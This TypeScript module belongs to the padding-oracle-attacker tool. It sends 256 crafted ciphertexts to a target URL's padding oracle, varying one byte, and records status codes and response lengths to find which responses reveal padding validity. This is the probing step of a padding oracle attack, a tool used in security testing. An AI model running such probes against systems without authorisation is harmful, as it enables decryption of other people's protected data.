import bluebird from './bluebird' // eslint-disable-line import/order

import path from 'path'
import ow from 'ow'
import fse from 'fs-extra'
import tmp from 'tmp-promise'
import chalk from 'chalk'
import { range, orderBy } from 'lodash'

import { analysis } from './logging'
import OracleCaller from './oracle-caller'
import { OracleResult, ResponseAnalysisOptions } from './types'
import { getStatusCodeColor, stringifyHeaders } from './util'

const { logStart, logCompletion } = analysis

const byteRange = range(0, 256)
async function analyseResponses({
  url, blockSize, logMode = 'full', concurrency = 128, isCacheEnabled = true, saveResponsesToTmpDir = true, ...args
}: ResponseAnalysisOptions) {
  ow(blockSize, ow.number)
  ow(concurrency, ow.number)

  if (['full', 'minimal'].includes(logMode)) await logStart({ url, blockSize })

  const { callOracle, networkStats } = OracleCaller({ url, isCacheEnabled, ...args })

  const statusCodeFreq: {[key: string]: number} = {}
  const bodyLengthFreq: {[key: string]: number} = {}
  const responses: {[key: number]: OracleResult} = {}
  const rows: string[][] = []
  async function processByte(byte: number) {
    const twoBlocks = Buffer.alloc(blockSize * 2)
    twoBlocks[blockSize - 1] = byte
    const req = await callOracle(twoBlocks)
    const { statusCode } = req
    const cl = req.body.length
    responses[byte] = req
    statusCodeFreq[statusCode] = (statusCodeFreq[statusCode] || 0) + 1
    bodyLengthFreq[cl] = (bodyLengthFreq[cl] || 0) + 1
    const color = getStatusCodeColor(statusCode)
    rows.push([String(byte), chalk[color](String(statusCode)), String(cl)])
  }
  if (concurrency > 1) {
    await bluebird.map(byteRange, processByte, { concurrency })
  } else {
    for (const byte of byteRange) await processByte(byte)
  }

  const tmpDirPath = saveResponsesToTmpDir ? (await tmp.dir({ prefix: 'poattack_' })).path : ''
  if (saveResponsesToTmpDir) {
    await bluebird.map(Object.entries(responses),
      ([byte, res]) => fse.writeFile(path.join(tmpDirPath, byte + '.html'), `<!--
Saved by https://github.com/KishanBagaria/padding-oracle-attacker
${res.statusCode}
${stringifyHeaders(res.headers)}
-->
${res.body}`))
  }


  if (['full', 'minimal'].includes(logMode)) {
    const responsesTable = orderBy(rows, [1, 2, x => +x[0]])
    logCompletion({ responsesTable, networkStats, statusCodeFreq, bodyLengthFreq, tmpDirPath, isCacheEnabled })
  }
  return { responses, statusCodeFreq, bodyLengthFreq, tmpDirPath }
}

export default analyseResponses
